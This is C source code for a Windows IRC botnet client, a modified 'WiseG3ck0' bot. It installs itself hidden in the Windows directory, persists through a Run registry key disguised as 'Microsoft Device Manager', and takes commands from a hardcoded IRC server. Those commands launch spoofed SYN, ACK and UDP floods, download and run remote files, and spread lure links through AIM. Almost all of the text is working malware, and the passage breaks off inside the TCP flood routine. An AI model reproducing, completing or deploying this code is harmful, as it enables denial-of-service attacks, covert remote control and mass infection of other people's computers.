/*

WiseG3ck0 IRC bot * 9/9/2006 * 

modified by n0rm4l <dark_Stalker_wk6@hotmail.com>
-stripped useless features
-added server password support
-added aimspread

TODO
-Add string encryption
-Add Scanner ( netapi + vncrooter )
-Secure Current Login / Logout
-Add Rootkit
-Add username change if aim is running



commands:
  *NOTE* FOR SECRUITY PURPOSES ALL COMMANDS MUST BE ENTERED THROUGH TOPIC
  1)  . exit - exit bot
  2)  . spoof get - get current spoof address
  3)  . spoof off - disable spoofing from ip, only spoof from current subnet (default)
  4)  . spoof <ip> - set spoofing to an ip address (this can be used for example with ping, to create a smurf attack, or a syn flood to create a drdos attack)
  5)  . ack <ip> <port> <time> - attacks an ip with ack packets (spoofing, VERY fast sending)
  6)  . syn <ip> <port> <time> - attacks an ip with syn packets (spoofing, TURBO fast sending)
  7)  . random <ip> <port> <time> - alternates between syn/ack packets (spoofing, REALLY fast sending)

  10) . udp <ip> <port> <time> - sends udp packets (spoofed) to an ip, if port = 0 then it uses random desination ports
  11) . uptime - get the system uptime
  12) . sysinfo - gives you some info about the system
  13) . download <http url> <file> [execute] - downloads a file, execute is a boolean of wether to execute
  14) . aim <link> - aimspread..

 */

#define _WSPIAPI_COUNTOF
#define WIN32_LEAN_AND_MEAN
#pragma pack(1)


#include <windows.h>
#include <winsock2.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <shellapi.h>
#include <ws2tcpip.h>
#include <vfw.h>
#include <sql.h>
#include <sqlext.h>
#include <winnetwk.h>
#include <psapi.h>
#include <urlmon.h>

#define SYN 0x02 
#define ACK 0x10
#define IP_HDRINCL 2
#define REQ_DATASIZE 1024


typedef struct ip_hdr 
{ 
	unsigned char h_verlen; 
	unsigned char tos; 
	unsigned short total_len; 
	unsigned short ident; 
	unsigned short frag_and_flags; 
	unsigned char ttl; 
	unsigned char proto; 
	unsigned short checksum; 
	unsigned int sourceIP; 
	unsigned int destIP; 
}IPHEADER; 

typedef struct tsd_hdr  
{ 
	unsigned long saddr;
	unsigned long daddr;  
	char mbz; 
	char ptcl; 
	unsigned short tcpl; 
}PSDHEADER; 

typedef struct tcp_hdr 
{ 
	USHORT th_sport;  
	USHORT th_dport; 
	unsigned int th_seq; 
	unsigned int th_ack; 
	unsigned char th_lenres; 
	unsigned char th_flag;
	USHORT th_win; 
	USHORT th_sum; 
	USHORT th_urp; 
}TCPHEADER;

typedef struct tagICMPHDR
{ 
    unsigned char icmp_type;
    unsigned char icmp_code; 
    unsigned short icmp_cksum; 
    unsigned short icmp_id;
    unsigned short icmp_seq; 
} ICMPHDR, *PICMPHDR;

typedef struct tagECHOREQUEST
{
	IPHEADER ipHeader;
    ICMPHDR icmpHdr;
    char cData[REQ_DATASIZE];
} ECHOREQUEST, *PECHOREQUEST;

typedef struct udphdr
{
    unsigned short sport;	
    unsigned short dport;
    unsigned short Length; 	 
    unsigned short Checksum;
}UDPHDR;
typedef struct UDPPACKET
{
	IPHEADER ipHeader;
    UDPHDR udpHeader;
    char cData[REQ_DATASIZE];
}UDPPACKET;
//structures to allow multi threaded packet sending
typedef struct UDPFLOOD
{
	char target[256];
	int port;
	int time;
}UDPFLOOD;
typedef struct ICMPFLOOD
{
	char target[256];
	int time;
}ICMPFLOOD;
typedef struct TCPFLOOD
{
	char type[32];
	char target[256];
	int port;
	int time;
}TCPFLOOD;

typedef struct AIMSPREAD {
   char *pszMessage;
   BOOL bGotInfo;
   char *link;
} AIMSPREAD;

HWND FindBuddyList();
void SendIM(HWND imWindow, LPCTSTR message);
void IMAllWindows(LPCTSTR message);
void IMAll(HWND buddyList, LPCTSTR message);
DWORD WINAPI AIMSpread (void *pVoid);
void typetext(HWND, int, LPCTSTR);
void sendtext(int);
void activatefocus(HWND);
void cleartext();
DWORD WINAPI IMSpread (void *pVoid);
LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);
char * rndnick(char *strbuf);
int in(char *raw);
int parse(char *line);
USHORT checksum(USHORT *buffer, int size);
//LRESULT CALLBACK JournalLogProc(int code, WPARAM wParam, LPARAM lParam);
DWORD WINAPI UDP(LPVOID param);
//DWORD WINAPI ICMP(LPVOID param);
DWORD WINAPI TCP(LPVOID param);



int cpuspeed(void);
unsigned __int64 cyclecount();

void transfer_loop(SOCKET target, SOCKET client);

char regname[] = "Microsoft Device Manager";
//edit this to change the port
UINT port = 3334;
int key = 0x3ff38;
SOCKET CloneSocket[20];
int CloneCount;
char spoof[512];
HWND Window;
SOCKADDR_IN	send_sin;
SOCKET ssock;
char szClassName[] = "Explorer";
char EnablePassword[512];
char serv[512];
BOOL Enabled = FALSE;
BOOL connected;
BOOL spoofing;
SOCKET sock;
unsigned int uptime;
HHOOK keyhook;
BOOL keylogging;
char KeyBuffer[512];
HANDLE hLastFocus;
int KeyClr;
char target[MAX_PATH];
char server[512];
char chan[512];
char channel[512];
BOOL en;
char pass[16];

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    MSG messages;
    WNDCLASSEX wincl;
    WSADATA wsa;

	PeekMessage(0, 0, 0, 0, 0);
	Sleep(5000);
	WSAStartup(0x202, &wsa);
    wincl.hInstance = GetModuleHandle(NULL);
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;
    wincl.style = CS_DBLCLKS;
    wincl.cbSize = sizeof (WNDCLASSEX);
    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;
    wincl.cbClsExtra = 0;
    wincl.cbWndExtra = 0;
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;
    if (!RegisterClassEx (&wincl))
	{
		ExitProcess(0);
	}
	if (lpCmdLine[0] != '\0') {
		DeleteFile(lpCmdLine);
	}
    Window = CreateWindowEx (0, szClassName, "Explorer", WS_OVERLAPPEDWINDOW, 5000, 5000, 30, 30, HWND_DESKTOP, NULL, GetModuleHandle(NULL), NULL);
    ShowWindow (Window, SW_HIDE);
	connected = FALSE;
	spoofing = FALSE;
	keylogging = false;
    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }
    WSACleanup();
    ExitProcess(0);
	return 0;
}

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	SOCKADDR_IN sin;
	LPHOSTENT dns;
	unsigned long lpdwflags;
	char buffer[512];
	char nick1[16], nick[32];
	char *nickx;
	unsigned long err;
	HKEY reg;
	SOCKET test;
	BOOL opt;
	char svName[256];
	char svComment[512];
	int i;

    switch (message)
    {
		case WM_QUIT:
		case WM_CLOSE:
		case WM_DESTROY:
			wsprintf(buffer, "QUIT :WM_DESTROY\r\n");
			send(sock, buffer, lstrlen(buffer), 0);
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegSetValueEx(reg, regname, 0, REG_SZ, (const unsigned char *)&target, lstrlen(target)+1);
			RegCloseKey(reg);
			return 0;
			break;
		case WM_SHOWWINDOW:
		case WM_ACTIVATE:
		case WM_SETFOCUS:
			ShowWindow(hwnd, SW_HIDE);
			break;
		case WM_CREATE:
			DWORD dwThreadID;
			SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
			MoveWindow(hwnd, 5000, 5000, 0, 0, false);
			if (WaitForSingleObject(CreateMutex(NULL, FALSE, "winsockdevice32"), 30000) == WAIT_TIMEOUT) { ExitProcess(0); }
			CloneCount = 0;
			for (i = 0; i < 20; i++)
			{
				CloneSocket[i] = INVALID_SOCKET;
			}
			//-EDIT HERE-

			en = FALSE;
			strcpy(server,"r00t3d.d0h.be"); //main dns for bots to connect to
			strcpy(pass,"owned");
			//-STOP EDITING-
			strcpy(serv, server);
			strcpy(chan, "#beta#");
			strcpy(channel, chan);
			SendMessage(hwnd, WM_TIMER, 1, 0);
			SetTimer(hwnd, 1, 30000, NULL);
			break;
		case WM_QUERYENDSESSION:
			wsprintf(buffer, "QUIT :WM_QUERYENDSESSION\r\n");
			send(sock, buffer, lstrlen(buffer), 0);
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegSetValueEx(reg, regname, 0, REG_SZ, (const unsigned char *)&target, lstrlen(target)+1);
			RegCloseKey(reg);
			return TRUE;
			break;
		case 52911: //main bot callback
			switch (WSAGETSELECTEVENT(lParam))
			{
				case FD_READ:
					memset(buffer, 0, sizeof(buffer));
					ZeroMemory(buffer, sizeof(buffer));
					recv(sock, buffer, sizeof(buffer), 0);
					in(buffer);
					return DefWindowProc (hwnd, message, wParam, lParam);
				case FD_CONNECT:
					err = WSAGETSELECTERROR(lParam);
					//check if there was an error while connecting, if there was then change the server to the default server (in case we were redirected with a 010, this way we wont lose the bot)
					if (err == WSAECONNREFUSED || err == WSAENETUNREACH || err == WSAETIMEDOUT || err == WSAEAFNOSUPPORT || err == WSAEFAULT || err == WSAEINVAL || err == WSAEISCONN || err == WSAEMFILE || err == WSAENOBUFS || err == WSAENOTCONN)
					{
						connected = FALSE;
						closesocket(sock);
						strcpy(serv, server);
					}
					uptime = GetTickCount();
					connected = TRUE;
					nickx = rndnick(nick1);
								SOCKADDR sa;
					int sas;
					OSVERSIONINFO verinfo;
            		verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
					GetVersionEx(&verinfo);
					char *os;
					char os2[140];

					if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
					if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "[NT]";
						}
					else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "[Win2k]";
					else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "[XP]";

            	    sprintf(nick,"%s%s", os,nickx);

					memset(buffer, 0, sizeof(buffer));
					ZeroMemory(buffer, sizeof(buffer));
					wsprintf(buffer, "PASS %s\r\n USER %s %s %s :%s\r\nNICK %s\r\n",pass, nick, nick, nick, nick, nick);
					send(sock, buffer, lstrlen(buffer), 0);
					return DefWindowProc (hwnd, message, wParam, lParam);
				case FD_CLOSE: 
					connected = FALSE;
					closesocket(sock);
					strcpy(serv, server);
					return DefWindowProc (hwnd, message, wParam, lParam);
			}
		case WM_TIMER:
			if (en == FALSE)
			{
				test = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
				opt = TRUE;
				if (setsockopt(test, IPPROTO_IP, IP_HDRINCL, (char *)&opt, sizeof(opt)) != SOCKET_ERROR)
				{
					char path[MAX_PATH];
					HANDLE hFile;
					DWORD oon;

					en = TRUE;
					ZeroMemory(target, sizeof(target));
					ZeroMemory(path, sizeof(path));
					GetModuleFileName(GetModuleHandle(NULL), path, sizeof(path));
				  
					GetWindowsDirectory(target, sizeof(target));
					SetCurrentDirectory(target);
					strcat(target, "\\mscmtl32.exe");
					if (lstrcmpi(path, target)) {
						SetFileAttributes(target, FILE_ATTRIBUTE_NORMAL);
						DeleteFile(target);
						CopyFile(path, target, FALSE);
						SetFileAttributes(target, FILE_ATTRIBUTE_SYSTEM);
						SetFileAttributes(target, FILE_ATTRIBUTE_HIDDEN);
       					RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
						RegSetValueEx(reg, regname, 0, REG_SZ, (const unsigned char *)&target, lstrlen(target)+1);
						RegCloseKey(reg);
					    ShellExecute(GetDesktopWindow(), "open", target, path, NULL, SW_HIDE);
						ExitProcess(0);
					}

				}
				closesocket(test);
			}
			if (en == FALSE)
			{
				return DefWindowProc (hwnd, message, wParam, lParam);
			}
			if (wParam == 1)
			{
				if (!connected)
				{
					if (InternetGetConnectedState(&lpdwflags, 0))
					{
						sock = socket(AF_INET, SOCK_STREAM, 0);
						WSAAsyncSelect(sock, hwnd, 52911, FD_READ | FD_CLOSE | FD_CONNECT);
						sin.sin_family = AF_INET;
						sin.sin_port = htons(port);
						sin.sin_addr.s_addr = inet_addr(serv);
						if (sin.sin_addr.s_addr == INADDR_NONE)
						{
							dns = gethostbyname(serv);
							if (dns == NULL)
							{
								return DefWindowProc (hwnd, message, wParam, lParam);
							}
							sin.sin_addr.s_addr = *(int long *)dns->h_addr_list[0];
						}
						connect(sock, (LPSOCKADDR)&sin, sizeof(SOCKADDR_IN));
					}
				}
			}
			return DefWindowProc (hwnd, message, wParam, lParam);
    }
    return DefWindowProc (hwnd, message, wParam, lParam);
}

int in(char *raw)
{
	unsigned int x = 0, i;
	char buf[1024];

	for (i = 0; i != lstrlen(raw); i++) {
		if (raw[i] == '\r' || raw[i] == '\n' || x == 1000) {
			if (x == 0) { continue; }
			buf[x] = '\0';
			x = 0;
			parse(buf);
			ZeroMemory(buf, sizeof(buf));
		}
		else {
			buf[x] = raw[i];
			x++;
		}
	}
	return 0;
}

int parse(char *line)
{
	char *arg[32];
	char buffer[512];
	int i, x;
	char nick1[12];

	Sleep(500);
	arg[0] = strtok(line, " ");
	for (i = 1; i < 32; i++) arg[i] = strtok(NULL, " ");
	if (lstrcmp(arg[0],"PING") == 0)
	{
		wsprintf(buffer, "PONG %s\r\nJOIN %s\r\n", arg[1], chan);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	else if (lstrcmp(arg[1],"001") == 0)
	{
		wsprintf(buffer, "JOIN %s\r\nMODE %s +ixp\r\n", chan, arg[2]);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	else if (!lstrcmpi(arg[1], "432") || !lstrcmpi(arg[1], "431") || !lstrcmpi(arg[1], "433")) {
		wsprintf(buffer, "NICK %s\r\n", rndnick(nick1));
		send(sock, buffer, lstrlen(buffer), 0);
	}
	else if (lstrcmp(arg[1],"010") == 0)
	{
		strncpy(serv, arg[3], 512);
		closesocket(sock);
		connected = FALSE;
	}

	else if (lstrcmp(arg[1],"PRIVMSG") == 0)
	{
		if (arg[2][1] == 35)
		{
			strcpy(channel, arg[2]);
		}
		else {
			strcpy(channel, chan);
		}
	}
	if (lstrcmp(arg[3],":.") == 0)
	{
		WIN32_FIND_DATA find;
		HANDLE hFind;
		HMODULE hDLL;
		FARPROC wisdom_OnPrivmsg;

		strcpy(buffer,"");
		for (i=4; i<32; i++)
		{
			if (lstrlen(arg[i]) > 0)
			{
				if (i == 5) strcpy(buffer, arg[i]);
				else 
				{
					strcat(buffer," ");
					strcat(buffer,arg[i]);
				}
			}
		}
		/* disabled for now for security reasons

		if (lstrcmp(arg[4],"enable") == 0)
		{
			if (lstrlen(arg[5]) == 0) return 0;
			if (lstrcmp(arg[5],EnablePassword) == 0)
			{
				Enabled = TRUE;
				wsprintf(buffer, "PRIVMSG %s :Password accepted, commands enabled.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
			}
		}
		if (!Enabled) return 0;
		if (lstrcmp(arg[4],"disable") == 0)
		{
			if (lstrlen(arg[5]) == 0) return 0;
			if (arg[5] != NULL)
			{
				memset(EnablePassword, 0, sizeof(EnablePassword));
				ZeroMemory(EnablePassword, sizeof(EnablePassword));
				strncpy(EnablePassword, arg[5], 512);
				Enabled = FALSE;
				wsprintf(buffer, "PRIVMSG %s :Enable password set to '%s', bot disabled.\r\n", channel, EnablePassword);
				send(sock, buffer, lstrlen(buffer), 0);
			}
		}
		
		*/
		if (lstrcmp(arg[4],"exit") == 0)
		{
			CloseWindow(Window);
			PostQuitMessage(0);
		}

		if (lstrcmp(arg[4],"spoof") == 0)
		{
			if (lstrlen(arg[5]) == 0) return 0;
			if (lstrcmp(arg[5],"off") == 0)
			{
				wsprintf(buffer, "PRIVMSG %s :Spoofing disabled.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
				spoofing = FALSE;
				return 0;
			}
			if (lstrcmp(arg[5],"get") == 0)
			{
				if (spoofing)
				{
					wsprintf(buffer, "PRIVMSG %s :Spoofing currently set to '%s'.\r\n", channel, spoof);
					send(sock, buffer, lstrlen(buffer), 0);
					return 0;
				}
				else 
				{
					SOCKADDR sa;
					int sas;
					char ip[32];

					sas = sizeof(sa);
					memset(&sa, 0, sizeof(sa));
					getsockname(sock, &sa, &sas);
					sprintf(ip, "%d.%d.%d.*", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4]);
					wsprintf(buffer, "PRIVMSG %s :Spoofing currently set to '%s'.\r\n", channel, ip);
					send(sock, buffer, lstrlen(buffer), 0);
					return 0;
				}
			}

			if (inet_addr(arg[5]) == INADDR_NONE)
			{
				wsprintf(buffer, "PRIVMSG %s :'%s' is an invalid IP address (it's not hard).\r\n", channel, arg[5]);
				send(sock, buffer, lstrlen(buffer), 0);
				return 0;
			}
			strcpy(spoof, arg[5]);
			spoofing = TRUE;
			wsprintf(buffer, "PRIVMSG %s :Spoof IP set to '%s'.\r\n", channel, arg[5]);
			send(sock, buffer, lstrlen(buffer), 0);
		}
	
		if (lstrcmp(arg[4],"download") == 0)
		{
			wsprintf(buffer, "PRIVMSG %s :Downloading %s to %s...\r\n", channel, arg[5], arg[6]);
			send(sock, buffer, lstrlen(buffer), 0);
			if (URLDownloadToFile(NULL, arg[5], arg[6], 0, NULL) == S_OK)
			{
				wsprintf(buffer, "PRIVMSG %s :File downloaded.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
			}
			else
			{
				wsprintf(buffer, "PRIVMSG %s :Error while downloading file.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
			}
			if (lstrcmp(arg[7],"1") == 0)
			{
				if (ShellExecute(GetDesktopWindow(),"open",arg[6],NULL,NULL,SW_HIDE) >= (HANDLE)32)
				{
					wsprintf(buffer, "PRIVMSG %s :File executed.\r\n", channel);
					send(sock, buffer, lstrlen(buffer), 0);
				}
				else
				{  
					wsprintf(buffer, "PRIVMSG %s :Error while executing file.\r\n", channel);
					send(sock, buffer, lstrlen(buffer), 0);
				}
			}
		}
		

		if (lstrcmp(arg[4],"aim") == 0)
		{
		   AIMSPREAD AIM;
		   char  message[200];
		   DWORD thread;
		     
           if (!arg[5]){
			   sprintf(buffer,"PRIVMSG %s :[-] Aimspread Invaild Syntax.\r\n", channel );
			   send (sock,buffer,lstrlen(buffer), 0 );
			   return 0;
		   }

		   sprintf(message,"Have you seen this? %s", arg[5]);

		   AIM.pszMessage = message;
		   wsprintf(buffer,"PRIVMSG %s :Sending %s Via Messengers.\r\n",channel, AIM.pszMessage);
		   send(sock, buffer, lstrlen(buffer), 0);
		   CreateThread(NULL, 0, &AIMSpread, (LPVOID)&AIM, 0, &thread);

		}
		
		if (lstrcmp(arg[4],"sysinfo") == 0)
		{
			SOCKADDR sa;
			int sas;
			MEMORYSTATUS memstat;
			OSVERSIONINFO verinfo;
			DWORD total, days, hours, minutes;
			SYSTEM_INFO CpuInfo;

			GlobalMemoryStatus(&memstat);
			GetSystemInfo(&CpuInfo);
			verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
			GetVersionEx(&verinfo);
			char *os;
			char os2[140];
			if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
				if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
			}
			else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2000";
			else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
			else os = "???";
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
				sprintf(os2, "%s (%s)", os, verinfo.szCSDVersion);
				os = os2;
			}
			sas = sizeof(sa);
			memset(&sa, 0, sizeof(sa));
			getsockname(sock, &sa, &sas);
			total = (GetTickCount() / 1000);
			days = total / 86400;
			hours = (total % 86400) / 3600;
			minutes = ((total % 86400) % 3600) / 60;
			wsprintf(buffer, "PRIVMSG %s :OS: Win%s. IP: %d.%d.%d.%d. Memory: %d/%dMB. CPU: %dMHz with %d processor(s). Uptime: %d day(s), %d hour(s), and %d minute(s).\r\n", channel, os, (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5], ((memstat.dwAvailPhys / 1024) / 1024), ((memstat.dwTotalPhys / 1024) / 1024), cpuspeed(), CpuInfo.dwNumberOfProcessors, days, hours, minutes);
			send(sock, buffer, lstrlen(buffer), 0);
		}
		if (lstrcmp(arg[4],"uptime") == 0)
		{
			DWORD total, days, hours, minutes;
			total = (GetTickCount() / 1000);
			days = total / 86400;
			hours = (total % 86400) / 3600;
			minutes = ((total % 86400) % 3600) / 60;
			wsprintf(buffer, "PRIVMSG %s :System Uptime: %d day(s), %d hour(s), and %d minute(s).\r\n", channel, days, hours, minutes);
			send(sock, buffer, lstrlen(buffer), 0);
			total = (GetTickCount() / 1000) - (uptime / 1000);
			days = total / 86400;
			hours = (total % 86400) / 3600;
			minutes = ((total % 86400) % 3600) / 60;
			wsprintf(buffer, "PRIVMSG %s :Connected to IRC for: %d day(s), %d hour(s), and %d minute(s).\r\n", channel, days, hours, minutes);
			send(sock, buffer, lstrlen(buffer), 0);
		}
		if (lstrcmp(arg[4],"remove") == 0) {
			HKEY hKey;

			RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
			RegDeleteValue(hKey, regname);
			RegCloseKey(hKey);
			MoveFileEx(target, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
			Sleep(2000);
			ExitProcess(0);
		}
	
		if (lstrcmp(arg[4],"udp") == 0)
		{
			UDPFLOOD info;
			DWORD thread;

			if (lstrlen(arg[7]) == 0) return 0;
			strncpy(info.target,arg[5],255);
			info.port = atoi(arg[6]);
			info.time = atoi(arg[7]);
			CreateThread(NULL, 0, &UDP, (void *)&info, 0, &thread);
		}
		
		
		if (lstrcmp(arg[4],"syn") == 0 || lstrcmp(arg[4],"ack") == 0 || lstrcmp(arg[4],"random") == 0)
		{
			TCPFLOOD info;
			DWORD thread;

			if (lstrlen(arg[7]) == 0) return 0;
			strncpy(info.target,arg[5],255);
			strncpy(info.type,arg[4],32);
			info.port = atoi(arg[6]);
			info.time = atoi(arg[7]);
			CreateThread(NULL, 0, &TCP, (void *)&info, 0, &thread);
		}

	}
	return 0;
}

char * rndnick(char *strbuf)
{
	int n, nl;
	char nick[12];

	srand(GetTickCount());
	memset(nick, 0, sizeof(nick));
	nl = (rand()%3)+5;
	for (n=0; n<nl; n++) nick[n] = (rand()%26)+97;
	nick[n+1] = '\0';
	strncpy(strbuf, nick, 12);
	return strbuf;
}

USHORT checksum(USHORT *buffer, int size) 
{ 
	unsigned long cksum=0; 
	while(size >1) 
	{ 
		cksum+=*buffer++; 
		size -=sizeof(USHORT); 
	} 
	if(size ) 
	{ 
		cksum += *(UCHAR*)buffer; 
	} 
	cksum = (cksum >> 16) + (cksum & 0xffff); 
	cksum += (cksum >>16); 
	return (USHORT)(~cksum); 
}

int cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;
	do {
		startcycle = cyclecount();
		Sleep(1000);
		speed = ((cyclecount()-startcycle)/100000)/10;
	} while (speed > 1000000);
	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;
	return speed;
 }

unsigned __int64 cyclecount(void)
{
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
}


DWORD WINAPI UDP(LPVOID param)
{
	UDPFLOOD info;
	static UDPPACKET packet;
	struct sockaddr_in udp_sin;
	SOCKET udpsock;
	BOOL flag;
	int ret;
	int sent;
	unsigned long start;
	char ip[32];
	SOCKADDR sa;
	int sas;
	char buffer[1024];

	info = *((UDPFLOOD *)param);
	if (info.time == 0)
	{
		wsprintf(buffer, "PRIVMSG %s :You cant send packets for 0 seconds.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	udpsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (udpsock == INVALID_SOCKET)
	{
		wsprintf(buffer, "PRIVMSG %s :Error calling socket().\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	flag = TRUE; 
	if (setsockopt(udpsock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) 
	{
		wsprintf(buffer, "PRIVMSG %s :Error calling setsockopt(). WSAGetLastError() returns %d.\r\n", channel, WSAGetLastError());
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	if (inet_addr(info.target) == INADDR_NONE)
	{
		wsprintf(buffer, "PRIVMSG %s :Invalid target IP.\r\n", channel, WSAGetLastError());
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	udp_sin.sin_family = AF_INET;
	udp_sin.sin_port = htons(0);
	udp_sin.sin_addr.s_addr = inet_addr(info.target);
	start = GetTickCount();
	wsprintf(buffer, "PRIVMSG %s :Sending packets to %s...\r\n", channel, info.target);
	send(sock, buffer, lstrlen(buffer), 0);
	sent = 0;
	while (((GetTickCount() - start) / 1000) <= (unsigned long)info.time)
	{
		if (!spoofing) 
		{
			sas = sizeof(sa);
			memset(&sa, 0, sizeof(sa));
			getsockname(sock, &sa, &sas);
			sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], rand()%255);
		}
		else
		{
			strcpy(ip, spoof);
		}
		packet.ipHeader.h_verlen=(4<<4 | sizeof(IPHEADER)/sizeof(unsigned long)); 
		packet.ipHeader.total_len=htons(sizeof(ECHOREQUEST)); 
		packet.ipHeader.ident=1; 
		packet.ipHeader.frag_and_flags=0; 
		packet.ipHeader.ttl=128; 
		packet.ipHeader.proto=IPPROTO_UDP; 
		packet.ipHeader.checksum=0; 
		packet.ipHeader.sourceIP=inet_addr(ip); 
		packet.ipHeader.destIP=udp_sin.sin_addr.s_addr;
		packet.udpHeader.Checksum = 0;
		if (info.port == 0) packet.udpHeader.dport = htons(rand()%1025);
		else packet.udpHeader.dport = htons(info.port);
		packet.udpHeader.sport = rand()%1025;
		packet.udpHeader.Length = htons(sizeof(UDPHDR)+REQ_DATASIZE);
		//fill the packet data with a random character..
		memset(packet.cData, rand()%255, REQ_DATASIZE);
		if (sendto(udpsock, (const char *) &packet, sizeof(packet), 0, (SOCKADDR *)&udp_sin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		{
			wsprintf(buffer, "PRIVMSG %s :Error sending packets to %s. eax=SOCKET_ERROR, WSAGetLastError()=%d. sizeof(buffer) = %d. Packets sent sucessfully = %d.\r\n", channel, info.target, WSAGetLastError(), sizeof(packet), sent);
			send(sock, buffer, lstrlen(buffer), 0);
			return 0;
		}
		sent = sent + 1;
	}
	closesocket(udpsock);
	wsprintf(buffer, "PRIVMSG %s :Finished sending packets to %s. Sent %d packet(s). ~%dMB of data sent (~%dK/s).\r\n", channel, info.target, sent, (((sent * sizeof(packet)) / 1024) / 1024), (((sent * sizeof(packet)) / 1024) / info.time));
	send(sock, buffer, lstrlen(buffer), 0);
	return 0;
}


void transfer_loop(SOCKET target, SOCKET client)
{
	int len;
	char buf[1024];
	fd_set fd;

	while (TRUE)
	{
		FD_ZERO(&fd);
		FD_SET(client, &fd);
		FD_SET(target, &fd);

		memset(buf, 0, sizeof(buf));
		select(0, &fd, NULL, NULL, NULL);

		if(FD_ISSET(client, &fd))
		{
			if((len = recv(client,buf,sizeof(buf),0))== -1) break;
			if(send(target,buf,len,0)== -1) break;
		}
	    if (FD_ISSET(target,&fd))
		{
			if((len = recv(target,buf,sizeof(buf),0))== -1) break;
			if(send(client,buf,len,0)== -1) break;
		}
	}
}
DWORD WINAPI TCP(LPVOID param)
{
	TCPFLOOD info;
	IPHEADER ipHeader; 
	TCPHEADER tcpHeader; 
	PSDHEADER psdHeader; 
	char szSendBuf[60]={0}; 
	BOOL flag; 
	SOCKET ssock; 
	SOCKADDR_IN addr_in; 
	int ret;
	SOCKADDR sa;
	int sas;
	char ip[32];
	unsigned long start;
	int sent;
	char buffer[1024];

	srand(GetTickCount());
	info = *((TCPFLOOD *)param);
	if (info.time == 0)
	{
		wsprintf(buffer, "PRIVMSG %s :You cant send packets for 0 seconds.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	ssock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	if (ssock==INVALID_SOCKET) 
	{
		wsprintf(buffer, "PRIVMSG %s :Error calling socket().\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	} 
	flag = TRUE; 
	if (setsockopt(ssock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR) 
	{ 
		wsprintf(buffer, "PRIVMSG %s :Error calling setsockopt(). WSAGetLastError() returns %d.\r\n", channel, WSAGetLastError());
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	} 
